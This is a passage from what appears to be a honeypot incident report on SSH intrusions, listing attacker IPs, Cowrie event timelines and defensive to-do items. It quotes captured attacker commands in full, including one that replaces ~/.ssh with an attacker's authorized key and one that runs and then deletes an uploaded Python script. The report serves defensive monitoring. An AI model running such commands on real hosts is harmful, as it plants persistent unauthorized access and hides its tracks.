| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:09:01` | `cowrie.session.connect` |
| `2026-07-16 22:09:01` | `cowrie.client.version` |
| `2026-07-16 22:09:02` | `cowrie.client.kex` |
| `2026-07-16 22:09:03` | `cowrie.login.success` |
| `2026-07-16 22:09:04` | `cowrie.session.params` |
| `2026-07-16 22:09:04` | `cowrie.command.input` |
| `2026-07-16 22:09:04` | `cowrie.command.failed` |
| `2026-07-16 22:09:04` | `cowrie.log.closed` |
| `2026-07-16 22:09:05` | `cowrie.session.params` |
| `2026-07-16 22:09:05` | `cowrie.command.input` |
| `2026-07-16 22:09:06` | `cowrie.session.file_download` |
| `2026-07-16 22:09:06` | `cowrie.log.closed` |
| `2026-07-16 22:09:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.207[.]138` to AbuseIPDB if not already reported
- [ ] Block `197.248.207[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95e307f9bc60

| Field | Detail |
|---|---|
| **Source IP** | `197.248.207[.]138` |
| **First Seen** | 2026-07-16 22:09 |
| **Last Seen** | 2026-07-16 22:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:09:06` | `cowrie.session.connect` |
| `2026-07-16 22:09:06` | `cowrie.client.version` |
| `2026-07-16 22:09:06` | `cowrie.client.kex` |
| `2026-07-16 22:09:07` | `cowrie.login.success` |
| `2026-07-16 22:09:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.207[.]138` to AbuseIPDB if not already reported
- [ ] Block `197.248.207[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-027499b03ff1

| Field | Detail |
|---|---|
| **Source IP** | `197.248.207[.]138` |
| **First Seen** | 2026-07-16 22:09 |
| **Last Seen** | 2026-07-16 22:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:09:08` | `cowrie.session.connect` |
| `2026-07-16 22:09:08` | `cowrie.client.version` |
| `2026-07-16 22:09:08` | `cowrie.client.kex` |
| `2026-07-16 22:09:09` | `cowrie.login.success` |
| `2026-07-16 22:09:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.207[.]138` to AbuseIPDB if not already reported
- [ ] Block `197.248.207[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c141603f949b

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-07-16 22:10 |
| **Last Seen** | 2026-07-16 22:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:10:03` | `cowrie.session.connect` |
| `2026-07-16 22:10:03` | `cowrie.client.version` |
| `2026-07-16 22:10:03` | `cowrie.client.kex` |
| `2026-07-16 22:10:05` | `cowrie.login.success` |
| `2026-07-16 22:10:06` | `cowrie.direct-tcpip.request` |
| `2026-07-16 22:10:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86e6fa754ab8

| Field | Detail |
|---|---|
| **Source IP** | `171.217.70[.]151` |
| **First Seen** | 2026-07-16 22:10 |
| **Last Seen** | 2026-07-16 22:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:10:15` | `cowrie.session.connect` |
| `2026-07-16 22:10:16` | `cowrie.client.version` |
| `2026-07-16 22:10:16` | `cowrie.client.kex` |
| `2026-07-16 22:10:18` | `cowrie.login.success` |
| `2026-07-16 22:10:19` | `cowrie.direct-tcpip.request` |
| `2026-07-16 22:10:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.217.70[.]151` to AbuseIPDB if not already reported
- [ ] Block `171.217.70[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dae79d256217

| Field | Detail |
|---|---|
| **Source IP** | `101.13.2[.]183` |
| **First Seen** | 2026-07-16 22:17 |
| **Last Seen** | 2026-07-16 22:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:17:19` | `cowrie.session.connect` |
| `2026-07-16 22:17:19` | `cowrie.client.version` |
| `2026-07-16 22:17:19` | `cowrie.client.kex` |
| `2026-07-16 22:17:22` | `cowrie.login.success` |
| `2026-07-16 22:17:22` | `cowrie.direct-tcpip.request` |
| `2026-07-16 22:17:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.2[.]183` to AbuseIPDB if not already reported
- [ ] Block `101.13.2[.]183` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d03b3f32264

| Field | Detail |
|---|---|
| **Source IP** | `103.158.138[.]179` |
| **First Seen** | 2026-07-16 22:20 |
| **Last Seen** | 2026-07-16 22:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:20:47` | `cowrie.session.connect` |
| `2026-07-16 22:20:47` | `cowrie.client.version` |
| `2026-07-16 22:20:47` | `cowrie.client.kex` |
| `2026-07-16 22:20:49` | `cowrie.login.success` |
| `2026-07-16 22:20:49` | `cowrie.direct-tcpip.request` |
| `2026-07-16 22:20:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.138[.]179` to AbuseIPDB if not already reported
- [ ] Block `103.158.138[.]179` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b407fe5f51a

| Field | Detail |
|---|---|
| **Source IP** | `83.239.84[.]130` |
| **First Seen** | 2026-07-16 22:20 |
| **Last Seen** | 2026-07-16 22:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:20:55` | `cowrie.session.connect` |
| `2026-07-16 22:20:55` | `cowrie.client.version` |
| `2026-07-16 22:20:55` | `cowrie.client.kex` |
| `2026-07-16 22:20:57` | `cowrie.login.success` |
| `2026-07-16 22:20:57` | `cowrie.direct-tcpip.request` |
| `2026-07-16 22:21:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.239.84[.]130` to AbuseIPDB if not already reported
- [ ] Block `83.239.84[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40f3461c0c51

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-16 22:22 |
| **Last Seen** | 2026-07-16 22:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:22:43` | `cowrie.session.connect` |
| `2026-07-16 22:22:43` | `cowrie.client.version` |
| `2026-07-16 22:22:43` | `cowrie.client.kex` |
| `2026-07-16 22:22:44` | `cowrie.login.success` |
| `2026-07-16 22:22:44` | `cowrie.direct-tcpip.request` |
| `2026-07-16 22:22:44` | `cowrie.direct-tcpip.ja4` |
| `2026-07-16 22:22:44` | `cowrie.direct-tcpip.data` |
| `2026-07-16 22:22:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f372415d3efe

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-16 22:23 |
| **Last Seen** | 2026-07-16 22:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:23:07` | `cowrie.session.connect` |
| `2026-07-16 22:23:07` | `cowrie.client.version` |
| `2026-07-16 22:23:07` | `cowrie.client.kex` |
| `2026-07-16 22:23:08` | `cowrie.login.success` |
| `2026-07-16 22:23:08` | `cowrie.direct-tcpip.request` |
| `2026-07-16 22:23:08` | `cowrie.direct-tcpip.ja4` |
| `2026-07-16 22:23:08` | `cowrie.direct-tcpip.data` |
| `2026-07-16 22:23:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e96b035642bb

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-16 22:25 |
| **Last Seen** | 2026-07-16 22:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:25:27` | `cowrie.session.connect` |
| `2026-07-16 22:25:27` | `cowrie.client.version` |
| `2026-07-16 22:25:27` | `cowrie.client.kex` |
| `2026-07-16 22:25:28` | `cowrie.login.success` |
| `2026-07-16 22:25:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb55703b1b23

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-16 22:25 |
| **Last Seen** | 2026-07-16 22:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:25:28` | `cowrie.session.connect` |
| `2026-07-16 22:25:28` | `cowrie.client.version` |
| `2026-07-16 22:25:28` | `cowrie.client.kex` |
| `2026-07-16 22:25:29` | `cowrie.login.success` |
| `2026-07-16 22:25:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab4989d20d52

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-16 22:25 |
| **Last Seen** | 2026-07-16 22:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:25:35` | `cowrie.session.connect` |
| `2026-07-16 22:25:35` | `cowrie.client.version` |
| `2026-07-16 22:25:35` | `cowrie.client.kex` |
| `2026-07-16 22:25:36` | `cowrie.login.success` |
| `2026-07-16 22:25:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6665dc4271ae

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-16 22:25 |
| **Last Seen** | 2026-07-16 22:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:25:36` | `cowrie.session.connect` |
| `2026-07-16 22:25:36` | `cowrie.client.version` |
| `2026-07-16 22:25:36` | `cowrie.client.kex` |
| `2026-07-16 22:25:36` | `cowrie.login.success` |
| `2026-07-16 22:25:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d618b561784

| Field | Detail |
|---|---|
| **Source IP** | `121.179.93[.]147` |
| **First Seen** | 2026-07-16 22:29 |
| **Last Seen** | 2026-07-16 22:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:29:22` | `cowrie.session.connect` |
| `2026-07-16 22:29:23` | `cowrie.client.version` |
| `2026-07-16 22:29:23` | `cowrie.client.kex` |
| `2026-07-16 22:29:25` | `cowrie.login.success` |
| `2026-07-16 22:29:26` | `cowrie.direct-tcpip.request` |
| `2026-07-16 22:29:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.179.93[.]147` to AbuseIPDB if not already reported
- [ ] Block `121.179.93[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fe8f0eacaa5

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-16 22:29 |
| **Last Seen** | 2026-07-16 22:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:29:26` | `cowrie.session.connect` |
| `2026-07-16 22:29:26` | `cowrie.client.version` |
| `2026-07-16 22:29:26` | `cowrie.client.kex` |
| `2026-07-16 22:29:26` | `cowrie.login.success` |
| `2026-07-16 22:29:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78e8bca3b36c

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-16 22:29 |
| **Last Seen** | 2026-07-16 22:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:29:26` | `cowrie.session.connect` |
| `2026-07-16 22:29:26` | `cowrie.client.version` |
| `2026-07-16 22:29:26` | `cowrie.client.kex` |
| `2026-07-16 22:29:27` | `cowrie.login.success` |
| `2026-07-16 22:29:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85d1b7a2d731

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-16 22:29 |
| **Last Seen** | 2026-07-16 22:31 |
| **Session Duration** | 125s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:29:45` | `cowrie.session.connect` |
| `2026-07-16 22:29:45` | `cowrie.client.version` |
| `2026-07-16 22:29:45` | `cowrie.client.kex` |
| `2026-07-16 22:29:46` | `cowrie.login.success` |
| `2026-07-16 22:29:47` | `cowrie.session.file_upload` |
| `2026-07-16 22:29:47` | `cowrie.session.params` |
| `2026-07-16 22:29:47` | `cowrie.command.input` |
| `2026-07-16 22:29:47` | `cowrie.command.input` |
| `2026-07-16 22:29:47` | `cowrie.command.input` |
| `2026-07-16 22:29:47` | `cowrie.command.failed` |
| `2026-07-16 22:29:48` | `cowrie.log.closed` |
| `2026-07-16 22:29:48` | `cowrie.session.params` |
| `2026-07-16 22:29:48` | `cowrie.command.input` |
| `2026-07-16 22:29:48` | `cowrie.log.closed` |
| `2026-07-16 22:29:49` | `cowrie.session.params` |
| `2026-07-16 22:29:49` | `cowrie.command.input` |
| `2026-07-16 22:29:49` | `cowrie.log.closed` |
| `2026-07-16 22:29:50` | `cowrie.session.params` |
| `2026-07-16 22:29:50` | `cowrie.command.input` |
| `2026-07-16 22:29:50` | `cowrie.command.failed` |
| `2026-07-16 22:29:50` | `cowrie.command.failed` |
| `2026-07-16 22:30:51` | `cowrie.session.params` |
| `2026-07-16 22:30:51` | `cowrie.command.input` |
| `2026-07-16 22:31:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10a34c57ef88

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-16 22:32 |
| **Last Seen** | 2026-07-16 22:34 |
| **Session Duration** | 126s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:32:06` | `cowrie.session.connect` |
| `2026-07-16 22:32:06` | `cowrie.client.version` |
| `2026-07-16 22:32:06` | `cowrie.client.kex` |
| `2026-07-16 22:32:07` | `cowrie.login.success` |
| `2026-07-16 22:32:08` | `cowrie.session.file_upload` |
| `2026-07-16 22:32:09` | `cowrie.session.params` |
| `2026-07-16 22:32:09` | `cowrie.command.input` |
| `2026-07-16 22:32:09` | `cowrie.command.input` |
| `2026-07-16 22:32:09` | `cowrie.command.input` |
| `2026-07-16 22:32:09` | `cowrie.command.failed` |
| `2026-07-16 22:32:09` | `cowrie.log.closed` |
| `2026-07-16 22:32:09` | `cowrie.session.params` |
| `2026-07-16 22:32:09` | `cowrie.command.input` |
| `2026-07-16 22:32:09` | `cowrie.log.closed` |
| `2026-07-16 22:32:10` | `cowrie.session.params` |
| `2026-07-16 22:32:10` | `cowrie.command.input` |
| `2026-07-16 22:32:10` | `cowrie.log.closed` |
| `2026-07-16 22:32:11` | `cowrie.session.params` |
| `2026-07-16 22:32:11` | `cowrie.command.input` |
| `2026-07-16 22:32:11` | `cowrie.command.failed` |
| `2026-07-16 22:32:11` | `cowrie.command.failed` |
| `2026-07-16 22:33:12` | `cowrie.session.params` |
| `2026-07-16 22:33:12` | `cowrie.command.input` |
| `2026-07-16 22:34:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7252a610046

| Field | Detail |
|---|---|
| **Source IP** | `192.34.128[.]202` |
| **First Seen** | 2026-07-16 22:34 |
| **Last Seen** | 2026-07-16 22:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:34:44` | `cowrie.session.connect` |
| `2026-07-16 22:34:45` | `cowrie.client.version` |
| `2026-07-16 22:34:45` | `cowrie.client.kex` |
| `2026-07-16 22:34:46` | `cowrie.login.success` |
| `2026-07-16 22:34:47` | `cowrie.direct-tcpip.request` |
| `2026-07-16 22:34:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.34.128[.]202` to AbuseIPDB if not already reported
- [ ] Block `192.34.128[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ea494612f73

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]60` |
| **First Seen** | 2026-07-16 22:37 |
| **Last Seen** | 2026-07-16 22:38 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, busybox TEST, cat /proc, /` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:37:50` | `cowrie.session.connect` |
| `2026-07-16 22:37:53` | `cowrie.login.success` |
| `2026-07-16 22:37:54` | `cowrie.session.params` |
| `2026-07-16 22:37:57` | `cowrie.command.input` |
| `2026-07-16 22:37:59` | `cowrie.command.input` |
| `2026-07-16 22:38:01` | `cowrie.command.input` |
| `2026-07-16 22:38:02` | `cowrie.command.input` |
| `2026-07-16 22:38:02` | `cowrie.log.closed` |
| `2026-07-16 22:38:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]60` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]60` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ab643e936ac

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-16 22:39 |
| **Last Seen** | 2026-07-16 22:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:39:56` | `cowrie.session.connect` |
| `2026-07-16 22:39:56` | `cowrie.client.version` |
| `2026-07-16 22:39:56` | `cowrie.client.kex` |
| `2026-07-16 22:39:56` | `cowrie.login.success` |
| `2026-07-16 22:39:57` | `cowrie.session.params` |
| `2026-07-16 22:39:57` | `cowrie.command.input` |
| `2026-07-16 22:39:57` | `cowrie.log.closed` |
| `2026-07-16 22:39:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84cfc1f216b8

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-16 22:40 |
| **Last Seen** | 2026-07-16 22:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:40:46` | `cowrie.session.connect` |
| `2026-07-16 22:40:46` | `cowrie.client.version` |
| `2026-07-16 22:40:46` | `cowrie.client.kex` |
| `2026-07-16 22:40:46` | `cowrie.login.success` |
| `2026-07-16 22:40:46` | `cowrie.direct-tcpip.request` |
| `2026-07-16 22:40:46` | `cowrie.direct-tcpip.data` |
| `2026-07-16 22:40:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1402c8afec7

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-16 22:41 |
| **Last Seen** | 2026-07-16 22:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:41:27` | `cowrie.session.connect` |
| `2026-07-16 22:41:27` | `cowrie.client.version` |
| `2026-07-16 22:41:27` | `cowrie.client.kex` |
| `2026-07-16 22:41:28` | `cowrie.login.success` |
| `2026-07-16 22:41:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-386a0548956d

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-16 22:41 |
| **Last Seen** | 2026-07-16 22:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 22:41:27` | `cowrie.session.connect` |
| `2026-07-16 22:41:27` | `cowrie.client.version` |
